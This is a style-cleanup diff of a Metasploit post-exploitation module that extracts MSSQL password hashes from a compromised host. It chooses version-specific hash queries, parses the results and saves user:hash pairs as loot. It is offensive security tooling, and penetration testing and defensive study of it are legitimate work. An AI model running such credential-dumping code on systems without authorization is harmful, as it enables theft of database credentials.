@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
       print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
-      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').lstrip.rstrip
+      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').strip
 
       begin
         get_sql_hash(instance_name)
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Post
   end
 
   def get_sql_version(instance_name)
-    vprint_status("Attempting to get version...")
+    vprint_status('Attempting to get version...')
 
     query = mssql_sql_info
 
@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Post
       vprint_status("MSSQL version found: #{version_year}")
       return version_year
     else
-      vprint_error("MSSQL version not found")
+      vprint_error('MSSQL version not found')
     end
   end
 
@@ -102,41 +102,41 @@ class MetasploitModule < Msf::Post
     version_year = get_sql_version(instance_name)
 
     case version_year
-    when "2000"
-      hash_type = "mssql"
+    when '2000'
+      hash_type = 'mssql'
       query = mssql_2k_password_hashes
-    when "2005", "2008"
-      hash_type = "mssql05"
+    when '2005', '2008'
+      hash_type = 'mssql05'
       query = mssql_2k5_password_hashes
-    when "2012", "2014"
-      hash_type = "mssql12"
+    when '2012', '2014'
+      hash_type = 'mssql12'
       query = mssql_2k5_password_hashes
     else
-      fail_with(Failure::Unknown, "Unable to determine MSSQL Version")
+      fail_with(Failure::Unknown, 'Unable to determine MSSQL Version')
     end
 
-    print_status("Attempting to get password hashes...")
+    print_status('Attempting to get password hashes...')
 
     res = run_sql(query, instance_name)
 
     if res.include?('0x')
       # Parse Data
-      if hash_type == "mssql12"
-        res = res.unpack('H*')[0].gsub("200d0a", "_CRLF_").gsub("0d0a", "").gsub("_CRLF_", "0d0a").gsub(/../) { |pair|
+      if hash_type == 'mssql12'
+        res = res.unpack('H*')[0].gsub('200d0a', '_CRLF_').gsub('0d0a', '').gsub('_CRLF_', '0d0a').gsub(/../) do |pair|
           pair.hex.chr
-        }
+        end
       end
       hash_array = res.split("\r\n").grep(/0x/)
 
       store_hashes(hash_array, hash_type)
     else
-      fail_with(Failure::Unknown, "Unable to retrieve hashes")
+      fail_with(Failure::Unknown, 'Unable to retrieve hashes')
     end
   end
 
   def store_hashes(hash_array, hash_type)
     # Save data
-    loot_hashes = ""
+    loot_hashes = ''
     hash_array.each do |row|
       user, hash = row.strip.split
 
@@ -180,13 +180,13 @@ class MetasploitModule < Msf::Post
       loot_hashes << "#{user}:#{hash}\n"
     end
 
-    unless loot_hashes.empty?
+    if loot_hashes.empty?
+      return false
+    else
       # Store MSSQL password hash as loot
       loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')
       print_good("MSSQL password hash saved in: #{loot_path}")
       return true
-    else
-      return false
     end
   end
 end
